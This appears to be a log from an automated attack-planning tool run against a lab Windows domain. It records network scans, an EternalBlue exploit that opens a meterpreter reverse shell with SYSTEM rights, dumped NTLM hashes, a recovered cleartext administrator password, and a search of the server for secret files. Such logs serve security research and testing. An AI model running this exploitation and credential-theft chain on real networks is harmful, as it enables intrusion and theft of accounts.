@@ -1,0 +1,185 @@
+2022-05-16 19:50:13,560     INFO action plan = ['arpscan', 'tcpscan']
+2022-05-16 19:50:13,560     INFO execute arpscan...
+2022-05-16 19:50:15,585     INFO arpscan result = 
+192.168.229.1	00:50:56:c0:00:08	VMware, Inc.
+192.168.229.2	00:50:56:ef:76:37	VMware, Inc.
+192.168.229.144	00:0c:29:3d:f8:b8	VMware, Inc.
+192.168.229.254	00:50:56:ee:88:97	VMware, Inc.
+
+2022-05-16 19:50:15,600     INFO execute nmap to 192.168.229.131
+2022-05-16 19:50:19,099     INFO detect_ports =  [{'number': '25/tcp', 'service': 'smtp', 'version': 'Postfix smtpd'}]
+2022-05-16 19:50:19,099     INFO execute nmap to 192.168.229.144
+2022-05-16 19:50:31,958     INFO detect_ports =  [{'number': '53/tcp',
+  'service': 'domain',
+  'version': 'Microsoft DNS 6.1.7601 (1DB1446A) (Windows Server 2008 R2 SP1)'},
+ {'number': '88/tcp',
+  'service': 'kerberos-sec',
+  'version': 'Microsoft Windows Kerberos (server time: 2022-05-16 11:50:29Z)'},
+ {'number': '135/tcp', 'service': 'msrpc', 'version': 'Microsoft Windows RPC'},
+ {'number': '139/tcp',
+  'service': 'netbios-ssn',
+  'version': 'Microsoft Windows netbios-ssn'},
+ {'number': '389/tcp',
+  'service': 'ldap',
+  'version': 'Microsoft Windows Active Directory LDAP (Domain: pinginglab.net, '
+             'Site: Default-First-Site-Name)'},
+ {'number': '445/tcp',
+  'service': 'microsoft-ds',
+  'version': 'Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: '
+             'PINGINGLAB)'},
+ {'number': '464/tcp', 'service': 'kpasswd5?', 'version': ''},
+ {'number': '593/tcp',
+  'service': 'ncacn_http',
+  'version': 'Microsoft Windows RPC over HTTP 1.0'},
+ {'number': '636/tcp', 'service': 'tcpwrapped', 'version': ''}]
+2022-05-16 19:50:31,959     INFO goap planning start...
+2022-05-16 19:50:31,959     INFO available plan = ['exploit_lateral', 'udpscan', 'arp_poisoning']
+2022-05-16 19:50:31,959     INFO available plan = ['udpscan', 'arp_poisoning', 'get_networkinfo', 'get_dc_info', 'get_logon_user', 'get_local_user', 'get_ospatch', 'get_processinfo', 'get_maindrvinfo', 'get_netdrvinfo']
+2022-05-16 19:50:31,960     INFO available plan = ['udpscan', 'arp_poisoning', 'get_networkinfo', 'get_dc_info', 'get_logon_user', 'get_domain_user', 'use_local_user', 'get_ospatch', 'get_processinfo', 'get_maindrvinfo', 'get_netdrvinfo']
+2022-05-16 19:50:31,960     INFO available plan = ['udpscan', 'arp_poisoning', 'get_networkinfo', 'get_dc_info', 'get_logon_user', 'use_local_user', 'use_domain_user', 'get_ospatch', 'get_processinfo', 'get_maindrvinfo', 'get_netdrvinfo']
+2022-05-16 19:50:31,960     INFO available plan = ['udpscan', 'arp_poisoning', 'get_networkinfo', 'get_dc_info', 'get_logon_user', 'use_local_user', 'use_domain_user', 'get_ospatch', 'get_processinfo', 'get_maindrvinfo', 'get_nw_secretinfo']
+2022-05-16 19:50:31,960     INFO action plan = ['exploit_lateral', 'get_local_user', 'get_domain_user', 'get_netdrvinfo', 'get_nw_secretinfo']
+2022-05-16 19:50:42,220     INFO execute ms17_010 eternalblue...
+2022-05-16 19:50:42,254     INFO target =  192.168.229.144
+2022-05-16 19:50:42,254     INFO port =  4066
+2022-05-16 19:50:42,255     INFO payload =  windows/x64/meterpreter/reverse_tcp
+2022-05-16 19:50:42,747     INFO execute exploit...
+2022-05-16 19:51:42,807    DEBUG sessions_list = {'1': {'arch': 'x64',
+       'desc': 'Meterpreter',
+       'exploit_uuid': 'nrvglpr8',
+       'info': 'NT AUTHORITY\\SYSTEM @ BLUETEAM-SERVER',
+       'platform': 'windows',
+       'routes': '',
+       'session_host': '192.168.229.144',
+       'session_port': 445,
+       'target_host': '192.168.229.144',
+       'tunnel_local': '192.168.229.131:4066',
+       'tunnel_peer': '192.168.229.144:55001',
+       'type': 'meterpreter',
+       'username': 'root',
+       'uuid': '9yzvrtip',
+       'via_exploit': 'exploit/windows/smb/ms17_010_eternalblue',
+       'via_payload': 'payload/windows/x64/meterpreter/reverse_tcp',
+       'workspace': 'false'}}
+2022-05-16 19:51:42,807     INFO exploit success...
+2022-05-16 19:51:52,825     INFO execute get local_user info
+2022-05-16 19:52:02,848     INFO [-] Error running command upload: Errno::ENOENT No such file or directory @ rb_file_s_stat - /home/moryson/Desktop/project/net-user.bat
+
+2022-05-16 19:52:22,877     INFO Process 2880 created.
+
+2022-05-16 19:52:52,917     INFO [*] Downloading: net-user.log -> /home/moryson/Desktop/project/net-user.log
+[*] Downloaded 261.00 B of 261.00 B (100.0%): net-user.log -> /home/moryson/Desktop/project/net-user.log
+[*] download   : net-user.log -> /home/moryson/Desktop/project/net-user.log
+
+2022-05-16 19:53:12,937     INFO 
+2022-05-16 19:53:12,937     INFO local account list = ['Administrator', 'Guest', 'krbtgt', 'moryson']
+2022-05-16 19:53:32,973     INFO [*] Running module against BLUETEAM-SERVER
+[*] Hashes will be saved to the database if one is connected.
+[+] Hashes will be saved in loot in JtR password file format to:
+[*] /root/.msf4/loot/20220516195323_default_192.168.229.144_windows.hashes_605035.txt
+[+] 	This host is a Domain Controller!
+[*] Dumping password hashes...
+[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:e0727437fab70cc68baeb1ee7cd06b03
+[+] 	krbtgt:502:aad3b435b51404eeaad3b435b51404ee:dcc9cf34c597ec85a0a8e5ebe6cc80dd
+[+] 	moryson:1105:aad3b435b51404eeaad3b435b51404ee:5b5fa287dde85beeb88c6c27050fac0c
+[+] 	BLUETEAM-SERVER$:1000:aad3b435b51404eeaad3b435b51404ee:d4748b5b77cc6f03944339c336200034
+[+] 	BLUETEAM-WIN7$:1103:aad3b435b51404eeaad3b435b51404ee:b1d5b0e1b01c5971cbb091089af9b9ee
+[+] 	BLUETEAM-WIN10$:1104:aad3b435b51404eeaad3b435b51404ee:bf9bbb1c6342a1243a90d7915e164bcd
+
+2022-05-16 19:53:32,973     INFO hash_list = ['e0727437fab70cc68baeb1ee7cd06b03',
+ 'dcc9cf34c597ec85a0a8e5ebe6cc80dd',
+ '5b5fa287dde85beeb88c6c27050fac0c']
+2022-05-16 19:54:18,013     INFO [+] Running as SYSTEM
+[*] Retrieving tspkg credentials
+tspkg credentials
+=================
+
+Username       Domain      Password
+--------       ------      --------
+Administrator  PINGINGLAB  19980630+Lmd
+
+
+
+2022-05-16 19:54:18,013     INFO pass_list = ['19980630+Lmd']
+2022-05-16 19:54:28,030     INFO execute get domain_user info..
+2022-05-16 19:54:38,049     INFO [*] uploading  : /home/moryson/Desktop/project/bat/net-user-domain.bat -> net-user-domain.bat
+[*] Uploaded 58.00 B of 58.00 B (100.0%): /home/moryson/Desktop/project/bat/net-user-domain.bat -> net-user-domain.bat
+[*] uploaded   : /home/moryson/Desktop/project/bat/net-user-domain.bat -> net-user-domain.bat
+
+2022-05-16 19:54:58,058     INFO Process 812 created.
+
+2022-05-16 19:55:28,091     INFO [*] Downloading: net-user-domain.log -> /home/moryson/Desktop/project/net-user-domain.log
+[*] Downloaded 261.00 B of 261.00 B (100.0%): net-user-domain.log -> /home/moryson/Desktop/project/net-user-domain.log
+[*] download   : net-user-domain.log -> /home/moryson/Desktop/project/net-user-domain.log
+
+2022-05-16 19:55:48,118     INFO 
+2022-05-16 19:55:48,119     INFO domain account list = ['Administrator', 'Guest', 'krbtgt', 'moryson']
+2022-05-16 19:56:33,187     INFO [+] Running as SYSTEM
+[*] Retrieving tspkg credentials
+tspkg credentials
+=================
+
+Username       Domain      Password
+--------       ------      --------
+Administrator  PINGINGLAB  19980630+Lmd
+
+
+
+2022-05-16 19:56:33,187     INFO pass_list = ['19980630+Lmd']
+2022-05-16 19:56:43,203     INFO execute netuse...
+2022-05-16 19:56:53,223     INFO [*] uploading  : /home/moryson/Desktop/project/bat/net-use.bat -> net-use.bat
+[*] Uploaded 41.00 B of 41.00 B (100.0%): /home/moryson/Desktop/project/bat/net-use.bat -> net-use.bat
+[*] uploaded   : /home/moryson/Desktop/project/bat/net-use.bat -> net-use.bat
+
+2022-05-16 19:57:13,245     INFO Process 1744 created.
+
+2022-05-16 19:57:43,285     INFO [*] Downloading: net-use.log -> /home/moryson/Desktop/project/net-use.log
+[*] Downloaded 76.00 B of 76.00 B (100.0%): net-use.log -> /home/moryson/Desktop/project/net-use.log
+[*] download   : net-use.log -> /home/moryson/Desktop/project/net-use.log
+
+2022-05-16 19:58:03,313     INFO 
+2022-05-16 19:58:03,313     INFO network drive list = []
+2022-05-16 19:58:03,315     INFO goap planning start...
+2022-05-16 19:58:03,315     INFO available plan = ['udpscan', 'arp_poisoning', 'get_networkinfo', 'get_dc_info', 'get_logon_user', 'use_local_user', 'use_domain_user', 'get_ospatch', 'get_processinfo', 'get_maindrvinfo', 'get_netdrvinfo']
+2022-05-16 19:58:03,315     INFO available plan = ['udpscan', 'arp_poisoning', 'get_networkinfo', 'get_dc_info', 'get_logon_user', 'use_local_user', 'use_domain_user', 'get_ospatch', 'get_processinfo', 'get_netdrvinfo', 'get_local_secretinfo']
+2022-05-16 19:58:03,315     INFO action plan = ['get_maindrvinfo', 'get_local_secretinfo']
+2022-05-16 19:58:13,328     INFO execute get maindrvinfo...
+2022-05-16 19:58:23,348     INFO 
+Mounts / Drives
+===============
+
+Name  Type   Size (Total)  Size (Free)  Mapped to
+----  ----   ------------  -----------  ---------
+C:\   fixed  199.90 GiB    188.42 GiB
+D:\   cdrom  0.00 B        0.00 B
+
+
+Total mounts/drives: 2
+
+
+2022-05-16 19:58:23,348     INFO local drive = ['C:\\', 'fixed', 'D:\\', 'cdrom']
+2022-05-16 19:58:33,363     INFO execute get localsecretinfo...
+2022-05-16 19:58:43,384     INFO C:\Windows\system32
+
+2022-05-16 19:58:53,403     INFO 
+2022-05-16 19:59:03,422     INFO Listing: C:\Windows\TEMP
+========================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+040777/rwxrwxrwx  0       dir   2022-03-04 14:58:50 +0800  Crashpad
+100666/rw-rw-rw-  0       fil   2020-06-18 15:42:31 +0800  DMIDCB7.tmp
+100666/rw-rw-rw-  245294  fil   2022-05-05 10:57:27 +0800  chrome_installer.log
+100666/rw-rw-rw-  27      fil   2022-03-04 14:55:40 +0800  secret.txt
+100666/rw-rw-rw-  23      fil   2022-04-01 15:50:14 +0800  systeminfo.txt
+040777/rwxrwxrwx  0       dir   2021-01-07 13:25:41 +0800  vmware-SYSTEM
+100666/rw-rw-rw-  311300  fil   2022-05-05 13:48:45 +0800  vmware-vmsvc-SYSTEM.log
+100666/rw-rw-rw-  6039    fil   2022-05-05 13:48:45 +0800  vmware-vmtoolsd-Administrator.log
+100666/rw-rw-rw-  5940    fil   2022-05-05 13:39:06 +0800  vmware-vmtoolsd-SYSTEM.log
+100666/rw-rw-rw-  150405  fil   2022-05-05 13:48:45 +0800  vmware-vmusr-Administrator.log
+100666/rw-rw-rw-  5568    fil   2022-05-05 13:39:08 +0800  vmware-vmvss-SYSTEM.log
+040777/rwxrwxrwx  0       dir   2020-10-19 18:58:17 +0800  {237E9D49-0984-4CEE-A510-2E5FF3C95460}
+040777/rwxrwxrwx  0       dir   2020-10-19 18:58:13 +0800  {3369A95A-F561-43A0-B594-65CE37F5B3A6}
+
+
+2022-05-16 19:59:03,422     INFO secret_data = 1
